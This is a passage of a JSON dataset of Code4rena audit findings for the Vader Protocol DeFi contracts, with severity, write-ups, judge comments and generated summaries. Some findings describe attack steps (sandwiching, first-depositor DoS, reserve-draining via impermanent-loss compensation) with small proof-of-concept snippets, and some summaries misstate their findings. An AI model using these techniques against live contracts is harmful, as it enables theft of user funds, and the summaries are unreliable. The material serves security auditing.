the pool now\n    # there would be revert\n\n    router.functions.addLiquidity(dai.address, vader.address, 1, deposit_amount, user, 10**18).transact()\n\n```\n\n[VaderMath.sol#L42](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/math/VaderMath.sol#L42)\n\n```solidity\n    ((totalPoolUnits * poolUnitFactor) / denominator) * slip\n```\n\nSince the scale of the total supply is (10\\*\\*18)^2, the operation would overflow.\n\n#### Tools Used\n\nNone\n\n#### Recommended Mitigation Steps\n\nSet a minimum deposit amount (both asset amount and native amount) for the first lp provider.\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/109)**\n\n",
      "summary": "\nThe bug report is about a vulnerability that can be exploited to cause a Denial of Service (DoS) on the system. The vulnerability occurs when the first liquidity provider sets the pool's rate to an extreme value, which prevents anyone from being able to deposit to the pool. This vulnerability is considered medium-risk. A proof of concept is provided that shows how the attack can be carried out. The code shows how a malicious attacker can back-run the `setTokenSupport` and set the pool's price to the extreme. This is caused by an overflow in the operation due to the scale of the total supply being (10**18)^2. The recommended mitigation step is to set a minimum deposit amount for the first liquidity provider.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/109",
      "tags": [],
      "finders": [
        "jonah1005"
      ]
    },
    {
      "id": "1027",
      "title": "[M-08] User may not receive the full amount of IL compensation",
      "impact": "MEDIUM",
      "content": "_Submitted by jonah1005_\n\n#### Impact\n\nThe user would not get full IL compensation if there's not enough funds in the reserve.\n[VaderReserve.sol#L76-L91](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/reserve/VaderReserve.sol#L76-L91)\n\nVaderReserve.sol#L85\n\n```solidity\n        uint256 actualAmount = _min(reserve(), amount);\n```\n\nWhile this is reasonable, users should be able to specify the minimum received amount in the transaction. Otherwise, it's vulnerable to some kind of MEV attack.\n\nI consider this is a medium-risk issue.\n\n#### Proof of Concept\n\nThe user can not specify a minimum IL compensation in the router.\n[VaderRouter.sol#L169-L207](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/router/VaderRouter.sol#L169-L207)\n\nThe user may not receive the full amount of compensation.\n[VaderReserve.sol#L76-L91](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/reserve/VaderReserve.sol#L76-L91)\n\n#### Tools Used\n\nNone\n\n#### Recommended Mitigation Steps\n\nUsers should be able to protect themselves when burning lp.\n\nSome possible fixes:\n\n1.  Return the actual amount this line `reserve.reimburseImpermanentLoss(msg.sender, coveredloss);`\n2.  Checks whether there's slippage. Revert if the user doesn't receive the full amount.\n\nWe can add a new parameter in the function.\n\n```solidity\n    require(actualCompensation > minimumCompensation);\n```\n\nOr we can check the `amountAMin` after receiving the compensation.\n( assume tokenA is native token)\n\n```solidity\n    require(amountA +actualCompensation > amountAMin);\n```\n\n**[SamSteinGG (Vader) disputed](https://github.com/code-423n4/2021-11-vader-findings/issues/100#issuecomment-979149401):**\n >  This is intended functionality of the protocol to account for rounding errors and is a principle similar to SushiSwap's MasterChef contract.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/100#issuecomment-991485882):**\n > The sponsor acknowledges the issue.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/100#issuecomment-995744194):**\n > @alcueca They are never meant however it should still be possible to do so. With Uniswap V2, it is possible to interact with the contracts directly however doing so (without using a smart contract) will result in the same vulnerabilities as described in the issue. This is not intended usage and as such does not constitute an issue unless it is implied that the Uniswap V2 implementation is incorrect.\n> Intended functionality of the protocol cannot constitute a risk issue. This has been classified as a medium risk issue but it follows the standardized conventions of implementations like Sushiswap which are live.\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Vader DEX. It states that users may not get full IL compensation if there are not enough funds in the reserve. This is due to the fact that users cannot specify a minimum received amount in the router. This vulnerability is considered to be a medium-risk issue and could be exploited by a MEV attack. The recommended mitigation steps are to return the actual amount, check for slippage and revert if the user does not receive the full amount, or add a new parameter or check the amountAMin after receiving the compensation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/100",
      "tags": [],
      "finders": [
        "jonah1005"
      ]
    },
    {
      "id": "1026",
      "title": "[M-07] Missing hasStarted modifier, can lead to user vesting before the owner begin the vesting",
      "impact": "MEDIUM",
      "content": "_Submitted by rfa_\n\n#### Impact\n\nIn the `claimConverted()` function, the user can vest their vader token for a certain amount of time, but `hasStarted` modifier is missing,\nthis can lead to `claimConverted()` function is callable by anyone, and the user can claim eventhough the vesting havent been started by the owner.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/tokens/vesting/LinearVesting.sol#L158>\n\n#### Recommended Mitigation Steps\n\nadd hasStarted modifier\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/90#issuecomment-979146481):**\n > Duplicate of #89\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/90#issuecomment-991033983):**\n > Not a duplicate, different line.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/90#issuecomment-995751409):**\n > @alcueca This should be invalid.\n\n\n\n",
      "summary": "\nThis bug report concerns the claimConverted() function in the LinearVesting.sol smart contract. This function allows a user to vest their vader token for a certain amount of time. However, the hasStarted modifier is missing, which means that the function can be called by anyone, allowing them to claim the token even if the vesting has not been started by the owner. The proof of concept for this bug is available on GitHub. To mitigate this issue, it is recommended to add the hasStarted modifier.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/90",
      "tags": [],
      "finders": [
        "rfa"
      ]
    },
    {
      "id": "1025",
      "title": "[M-06] add liquidity is vulnerable to sandwich attack",
      "impact": "MEDIUM",
      "content": "_Submitted by jonah1005_\n\n### add liquidity is vulnerable to MEV\n\n#### Impact\n\n`addLiquidity` in the VaderRouter and VaderRouterV2 contract does not check the minimum liquidity amount. This makes users' funds vulnerable to sandwich attacks.\n\nThe team says a minimum amount is not required as the VaderPool supports imbalanced mint. However, imbalanced mint is a helper function of buying tokens and providing to lp. A sandwich attack would take over more than 50% of a transaction in an illiquid pool.\n\nGiven the current network environment, most transactions in the mempool would be sandwiched. However, users may avoid this attack if they only send tx through [flashbot RPC](https://medium.com/alchemistcoin/how-to-add-flashbots-protect-rpc-to-your-metamask-3f1412a16787). I consider this is a medium-risk issue.\n\n#### Proof of Concept\n\n[VaderRouterV2.sol#L77-L96](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/router/VaderRouterV2.sol#L77-L96)\n\nThat says a user wants to provide 1M ETH in the pool.\nAttackers can sandwich this trade as follows:\n\n1.  Buy Vader with 10M ETH and makes ETH extremely cheap\n2.  *Put user's tx here* User's tx would first buy a lot Vader and deposit to the pool.\n3.  Since ETH becomes even cheaper in the pool. The MEV attacker buyback ETH and get profit.\n\n#### Tools Used\n\nNone\n\n#### Recommended Mitigation Steps\n\nAlways check how much liquidity a user received in a transaction. A tx would not be sandwiched if it's not profitable.\n\nWe could learn a lot about MEV from [Robert Miller'tweets](https://twitter.com/bertcmiller).\n\n**[SamSteinGG (Vader) disputed](https://github.com/code-423n4/2021-11-vader-findings/issues/67#issuecomment-979142887):**\n > The design of the Thorchain CLP model is meant to prevent flash-loan based attacks as it allows a maximum trade size of 25% on a given iteration with a high-enough fee to render the attack unprofitable. Please request a tangible test case from the warden to consider this exhibit valid.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/67#issuecomment-991469716):**\n > There is no documentation stating that the deployment of Vader is restricted to Thorchain. The issue is valid.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/67#issuecomment-995755429):**\n > @alcueca The model itself is what has this trait, it does not relate to the blockchain implementation itself. It is intended functionality as with its parent implementation.\n\n\n\n",
      "summary": "\nIn the bug report, the user Jonah1005 reported a vulnerability in the VaderRouter and VaderRouterV2 contract, which is that `addLiquidity` does not check the minimum liquidity amount. This makes users' funds vulnerable to sandwich attacks, which is a type of miner extractable value (MEV) attack. The team says a minimum amount is not required as the VaderPool supports imbalanced mint, but this could be exploited by attackers. The bug report includes a proof of concept, as well as recommended mitigation steps to avoid the attack. The recommended mitigation steps include always checking how much liquidity a user received in a transaction, as a tx would not be sandwiched if it's not profitable. Additionally, users should use the flashbot RPC to send transactions. The bug report also suggests learning more about MEV from Robert Miller's tweets.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/67",
      "tags": [],
      "finders": [
        "jonah1005"
      ]
    },
    {
      "id": "1024",
      "title": "[M-05] LinearVesting does not calculate vested amount linearly",
      "impact": "MEDIUM",
      "content": "_Submitted by xYrYuYx_\n\n#### Impact\n\n- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/tokens/vesting/LinearVesting.sol#L261>\n\n- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/tokens/vesting/LinearVesting.sol#L294>\n\nThese calculations are incorrect for linear vesting.\n\n#### Proof of Concept\n\ni.e.\nif start amount is 10000, and duration is 100 seconds.\nAfter 50 seconds, user can claim 5000 which is 50%\n\nAfter another 10 seconds, user need to claim 1000 which is 10%, but current calculation return 500.\n\n#### Tools Used\n\nManual\n\n#### Recommended Mitigation Steps\n\nChange formula to\n`User total amount * (block.timestamp – start) / (vesting duration) – user claimed amount.`\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/44)** \n\n",
      "summary": "\nThis bug report is about a vulnerability in the LinearVesting.sol contract on the code-423n4/2021-11-vader repository. The calculations for linear vesting are incorrect, which allows users to claim more than their allocated amount. This vulnerability was discovered through manual testing. To fix this issue, the formula should be changed to `User total amount * (block.timestamp – start) / (vesting duration) – user claimed amount.` This will ensure that users can only claim the amount allocated to them.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/44",
      "tags": [],
      "finders": [
        "xYrYuYx"
      ]
    },
    {
      "id": "1023",
      "title": "[M-04] Inconsistent balance when supplying transfer-on-fee or deflationary tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by Reigada_\n\n#### Impact\n\nIn the contract StakingRewards, the stake function assume that the amount of stakingToken is transferred to the smart contract after calling the safeTransferFrom function (and thus it updates the `\\_balances` mapping). However, this may not be true if the stakingToken is a transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount in the `\\_balances` mapping.\n\nSame can be applied for the withdraw function.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/staking-rewards/StakingRewards.sol#L100-L102>\n\n#### Tools Used\n\nManual code review\n\n#### Recommended Mitigation Steps\n\nGet the actual received amount by calculating the difference of token balance before and after the transfer. For example:\n`uint256 balanceBefore = stakingToken.balanceOf(address(this));\nstakingToken.safeTransferFrom(msg.sender, address(this), amount);\nuint256 receivedAmount = stakingToken.balanceOf(address(this)) - balanceBefore;\n\\_totalSupply = \\_totalSupply.add(receivedAmount);\n\\_balances\\[msg.sender] = \\_balances\\[msg.sender].add(receivedAmount);`\n\n**[0xstormtrooper (Vader) acknowledged](https://github.com/code-423n4/2021-11-vader-findings/issues/30#issuecomment-968674323):**\n > VADER / USDV fee on transfer will be removed\n\n\n\n",
      "summary": "\nThis bug report describes a vulnerability in the contract StakingRewards. The stake and withdraw functions assume that the amount of stakingToken is transferred to the smart contract after calling the safeTransferFrom function, but this may not be true if the stakingToken is a transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount in the _balances mapping. This could lead to incorrect values in the _balances mapping. \n\nThe bug was identified through manual code review, and the recommended mitigation steps are to get the actual received amount by calculating the difference of token balance before and after the transfer. This can be done by taking the token balance before the transfer, performing the transfer, and then taking the token balance after the transfer and subtracting the two values. The received amount should then be used to update the _totalSupply and _balances mappings.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/30",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "Reigada"
      ]
    },
    {
      "id": "1022",
      "title": "[M-03] Permissioned nature of TwapOracle allows owner to manipulate oracle",
      "impact": "MEDIUM",
      "content": "## Handle\n\nTomFrench\n\n\n## Vulnerability details\n\n## Impact\n\nPotentially frozen or purposefully inaccurate USDV:VADER price feed.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L322\n\nOnly the owner of `TwapOracle` can call `update` on the oracle. Should the owner desire they could cease calling `update` on the oracle for a period. Over this period the relative prices of VADER and USDC will vary.\n\nAfter some period `timeElapsed` the owner can call `update` again. A TWAP is a lagging indicator and due to the owner ceasing to update the oracle so `timeElapsed` will be very large, therefore we're averaging over a long period into the past resulting in a value which may not be representative of the current USDV:VADER exchange rate.\n\nThe owner can therefore selectively update the oracle so to result in prices which allow them to extract value from the system.\n\n## Recommended Mitigation Steps\n\nRemove the permissioning from `TwapOracle.update`",
      "summary": "\nA bug report has been submitted by TomFrench regarding the potentially frozen or purposefully inaccurate USDV:VADER price feed. The bug could allow the owner of the TwapOracle to cease calling the update on the oracle for a period of time. This would result in a TWAP, which is a lagging indicator, to average over a long period into the past resulting in a value which may not be representative of the current USDV:VADER exchange rate. This would allow the owner to extract value from the system. The recommended mitigation step is to remove the permissioning from TwapOracle.update.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/20",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1021",
      "title": "[M-02] Should a Chainlink aggregator become stuck in a stale state then TwapOracle will become irrecoverably broken",
      "impact": "MEDIUM",
      "content": "_Submitted by TomFrenchBlockchain_\n\n#### Impact\n\nInability to call `consult` on the TwapOracle and so calculate the exchange rate between USDV and VADER.\n\n#### Proof of Concept\n\nShould any of the Chainlink aggregators used by the TwapOracle becomes stuck in such a state that the check on L143-146 of `TwapOracle.sol` consistently fails (through a botched upgrade, etc.) then the `consult` function will always revert.\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L143-L146>\n\nThere is no method to update the address of the aggregator to use so the `TwapOracle` will be irrecoverable.\n\n#### Recommended Mitigation Steps\n\nAllow governance to update the aggregator for a pair (ideally with a timelock.)\n\n\n**[SamSteinGG (Vader) diagreed with severity](https://github.com/code-423n4/2021-11-vader-findings/issues/16#issuecomment-979117099):**\n > The scenario of a Chainlink oracle ceasing function is very unlikely and would cause widespread issues in the DeFi space as a whole.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/16#issuecomment-991838030):**\n > I'm going to maintain the severity 2 rating despite the low probability of a Chainlink aggregator being permanently disabled. The risk exists, and in general third-party dependencies should be treated with respect in code and documentation.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/16#issuecomment-999354209):**\n > The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\n\n\n",
      "summary": "\nThis bug report is regarding the TwapOracle, which is used to calculate the exchange rate between USDV and VADER. The bug is that if any of the Chainlink aggregators used by the TwapOracle becomes stuck, then the `consult` function will always revert. This means that the TwapOracle will be irrecoverable. The recommended mitigation step is to allow governance to update the aggregator for a pair, ideally with a timelock.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/16",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1020",
      "title": "[M-01] Unbounded loop in TwapOracle.update can result in oracle being locked",
      "impact": "MEDIUM",
      "content": "_Submitted by TomFrenchBlockchain, also found by pauliax_\n\n#### Impact\n\nLoss of ability of `TwapOracle` to update should too many pools be added.\n\n#### Proof of Concept\n\n`TwapOracle` allows an unlimited number of pairs to be added and has no way of removing pairs after the fact. At the same time `TwapOracle.update` iterates through all pairs in order to update value for each pair.\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L322-L369>\n\n`TwapOracle.registerPair` is a permissioned function so that only the owner can add new pairs however should the owner account be compromised or not mindful of the number of pairs being added it is possible to put the oracle into a state in which it is unable to update. The oracle cannot recover from this state.\n\n#### Recommended Mitigation Steps\n\nPossible options:\n\n*   Add a method to stop tracking a particular pair\n*   Allow updating a subset of all pairs at a time.\n\n**[SamSteinGG (Vader) disagreed with severity](https://github.com/code-423n4/2021-11-vader-findings/issues/8#issuecomment-979105912):**\n > The severity of the finding should be reduced as it relies on ill behavior from its owner which is a multisignature address.\n>\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/8#issuecomment-991505334):**\n > The severity rating is valid since the signers might not be aware of the limitation, or the limitation might be reached by natural means.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/8#issuecomment-999354285):**\n > The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\n\n",
      "summary": "\nThis bug report concerns the TwapOracle, a contract that allows an unlimited number of pairs to be added and has no way of removing pairs after the fact. If too many pairs are added, the contract's ability to update is lost and it cannot recover. This is a serious issue, as it could lead to the loss of data. The recommended mitigation steps are to add a method to stop tracking a particular pair, and/or to allow updating a subset of all pairs at a time. This would help to ensure that the contract does not become overwhelmed and is able to update as necessary.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/8",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain",
        "pauliax"
      ]
    },
    {
      "id": "1019",
      "title": "[H-34] Incorrect Accrual Of sumNative and sumUSD In Producing Consultation Results ",
      "impact": "HIGH",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Vulnerability details\n\n## Impact\n\nThe `TwapOracle.consult()` function iterates over all token pairs which belong to either `VADER` or USDV` and then calculates the price of the respective asset by using both UniswapV2 and Chainlink price data. This helps to further protect against price manipulation attacks as the price is averaged out over the various registered token pairs.\n\nLet's say we wanted to query the price of `USDV`, we would sum up any token pair where `USDV == pairData.token0`.\n\nThe sum consists of the following:\n- Price of `USDV` denominated in terms of `token1` (`USDV/token1`).\n- Price of token1 denominated in terms of `USD` (`token1/USD`).\n\nConsider the following example:\n- `SUSHI` and `UNISWAP` are the only registered token pairs that exist alongside `USDV`.\n- Hence, calculating `sumNative` gives us an exchange rate that is denominated as the sum of `USDV/SUSHI` and `USDV/UNISWAP`.\n- Similarly, `sumUSD` gives us the following denominated pairs, `SUSHI/USD` and `UNISWAP/USD`.\n- Summing `sumUSD` and `sumNative` produces an entirely incorrect result as compared to multiplying the two results first and then summing.\n- The issue is equivalent to the same issue as performing `(p1 + p2)*(q1 + q2)` as compared to `(p1*q1 + p2*q2)`. Obviously, these two results are not equivalent, however, the `consult()` function treats them as such.\n- If we multiply the native price and Chainlink oracle results, then we can correctly calculate the price as such; `(SUSHI/USD * USDV/SUSHI + UNISWAP/USD * USDV/UNISWAP) / 2`, which should correctly give us the correct denomination and average price.\nHowever, the protocol calculates it as `((SUSHI/USD + UNISWAP/USD) * token.decimals()) / (USDV/SUSHI + USDV/UNISWAP)` which gives us an incorrectly denominated result.\n\nI'd classify this issue as high risk as the oracle returns false results upon being consulted. This can lead to issues in other areas of the protocol that use this data in performing sensitive actions.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L115-L157\n\nSimilar working implementation listed below:\n- https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L184-L211\n- https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L291-L304\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nTo calculate the correct consultation of a given token, the returned result should consist of a sum of `priceUSD * token.decimals() * priceNative` divided by the number of calculations. This should correctly take the average token pair price.\n\nThe following snippet of code details the relevant fix:\n```\n    function consult(address token) public view returns (uint256 result) {\n        uint256 pairCount = _pairs.length;\n\n        for (uint256 i = 0; i < pairCount; i++) {\n            PairData memory pairData = _pairs[i];\n\n            if (token == pairData.token0) {\n                //\n                // TODO - Review:\n                //   Verify price1Average is amount of USDV against 1 unit of token1\n                //\n\n                priceNative = pairData.price1Average.mul(1).decode144(); // native asset amount\n                if (pairData.price1Average._x != 0) {\n                    require(priceNative != 0);\n                } else {\n                    continue; // should skip newly registered assets that have not been updated yet.\n                }\n\n                (\n                    uint80 roundID,\n                    int256 price,\n                    ,\n                    ,\n                    uint80 answeredInRound\n                ) = AggregatorV3Interface(_aggregators[pairData.token1])\n                        .latestRoundData();\n\n                require(\n                    answeredInRound >= roundID,\n                    \"TwapOracle::consult: stale chainlink price\"\n                );\n                require(\n                    price != 0,\n                    \"TwapOracle::consult: chainlink malfunction\"\n                );\n                priceUSD = uint256(price) * (10**10);\n                result += ((priceUSD * IERC20Metadata(token).decimals()) * priceNative);\n            }\n        }\n        require(sumNative != 0, \"TwapOracle::consult: Sum of native is zero\");\n        return result;\n    }\n```",
      "summary": "\nA vulnerability was discovered in the `TwapOracle.consult()` function of the VADER protocol. This function calculates the price of an asset by using both UniswapV2 and Chainlink price data. The issue is that the protocol calculates the price incorrectly by summing the native price and Chainlink oracle results rather than multiplying them first and then summing. This incorrect calculation can lead to issues in other areas of the protocol that use this data in performing sensitive actions, and therefore should be classified as high risk. \n\nA proof of concept of the vulnerability can be found at https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L115-L157, and similar working implementations can be found at https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L184-L211 and https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L291-L304. Manual code review was used to discover the vulnerability.\n\nThe recommended mitigation step is to calculate the correct consultation of a given token by returning a sum of `priceUSD * token.decimals() * priceNative` divided by the number of calculations. This should correctly take the average token pair price. The code snippet provided should help with the implementation of this fix.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/260",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1018",
      "title": "[H-33] Mixing different types of LP shares can lead to losses for Synth holders",
      "impact": "HIGH",
      "content": "_Submitted by hyh_\n\n#### Impact\n\nUsers that mint Synths do not get pool shares, so exiting of normal LP can lead to their losses as no funds can be left for retrieval.\n\n#### Proof of Concept\n\n3 types of mint/burn: NFT, Fungible and Synths. Synths are most vilnerable as they do not have share: LP own the pool, so Synth's funds are lost in scenarios similar to:\n\n1.  LP deposit both sides to a pool\n2.  Synth deposit and mint a Synth\n3.  LP withdraws all as she owns all the pool liquidity, even when provided only part of it\n4.  Synth can't withdraw as no assets left\n\nburn NFT LP:\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/BasePoolV2.sol#L270>\n\nburn fungible LP:\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L374>\n\n#### Recommended Mitigation Steps\n\nTake into account liquidity that was provided by Synth minting.\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/257)** \n\n",
      "summary": "\nThis bug report describes a vulnerability in minting Synths that can lead to users losing their funds. The proof of concept explains that if an LP deposits both sides to a pool, a Synth user deposits and mints a Synth, and then the LP withdraws all of the liquidity, the Synth user cannot withdraw since there are no assets left. The recommended mitigation step is to take into account the liquidity that was provided by Synth minting. This will ensure that Synth users do not lose their funds in these scenarios.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/257",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1017",
      "title": "[H-32] Covering impermanent loss allows profiting off asymmetric liquidity provision at expense of reserve holdings",
      "impact": "HIGH",
      "content": "_Submitted by hyh_\n\n#### Impact\n\nPool funds will be siphoned out over time as swaps and asymmetric LP provision are balancing each other economically, while with introduction of IL reimbursement a malicious user can profit immediately from out of balance pool with a swap and profit again from IL coverage. This requires locking liquidity to a pool, but still represents an additional profit without additional risk at expense of reserve funds.\n\nAnother variant of exploiting this is to add liquidity in two steps: deposit 1 with 0 slip adjustment, perfectly matching current market price, deposit 2 with more Vader than market price suggests, moving pool out of balance with Vader becoming cheaper, then exiting deposit 1 with profit because slip adjustment reduce deposit 2's share issuance and deposit 1's now has more asset claims than before. Deposit 2 then need to wait and exit after some time.\n\nIL is calculated as ` ((originalAsset * releasedVader) / releasedAsset) + originalVader - ((releasedAsset * releasedVader) / releasedAsset) + releasedVader  `, i.e. original deposit values without taking account of slip adjustment are used, so providing more Vader in deposit 2 leads to greater IL, which this way have 2 parts: market movements related and skewed liquidity provision related. IL covering compensates for slip adjustments this way.\n\n#### Proof of Concept\n\nThe steps to reproduce are:\n\n1.  add asymmetric LP via mint (with NFT),\n2.  either swap gathering profit from pool skew or do symmetric deposit beforehand and exit it now\n3.  wait for some period for IL protection to be enabled, then withdraw, having IL covered by reserve fund\n\nRouter addLiquidity:\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/router/VaderRouterV2.sol#L114>\n\nNFT mint:\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/BasePoolV2.sol#L168>\n\nRouter removeLiquidity:\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/router/VaderRouterV2.sol#L227>\n\nNFT burn:\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L237>\n\nIL calculation:\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/math/VaderMath.sol#L73>\n\n#### Recommended Mitigation Steps\n\nAsymmetric liquidity provision doesn't provide much business value, introducing substantial attack surface, so the core recommendation here is to remove a possibility to add liquidity asymmetrically: instead of penalizing LP with slip adjustment do biggest liquidity addition with 0 slip adjustment that user provided funds allow, and return the remaining part.\n\nThis will also guard against cases when user added liquidity with big slip adjustment penalty without malicious intent, not realizing that this penalty will take place, an effect that poses reputational risk to any project using the approach.\n\nAllowing only symmetric liquidity addition removes the described attack surface.\n\n**[SamSteinGG (Vader) marked as duplicate](https://github.com/code-423n4/2021-11-vader-findings/issues/255)**\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/255#issuecomment-991000377):**\n > Duplicate of which other issue, @SamSteinGG?\n\n\n\n",
      "summary": "\nThis bug report is about the vulnerability of pool funds being siphoned out over time and a malicious user profiting from it. The steps to reproduce are adding asymmetric LP via mint, either swapping or doing symmetric deposit beforehand and exiting it, and then waiting for IL protection to be enabled and withdrawing. The recommended mitigation step is to remove the possibility to add liquidity asymmetrically and only allowing symmetric liquidity addition. This will guard against cases when the user added liquidity with a big slip adjustment penalty without malicious intent and also remove the attack surface.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/255",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1016",
      "title": "[H-31] Unused slippage params",
      "impact": "HIGH",
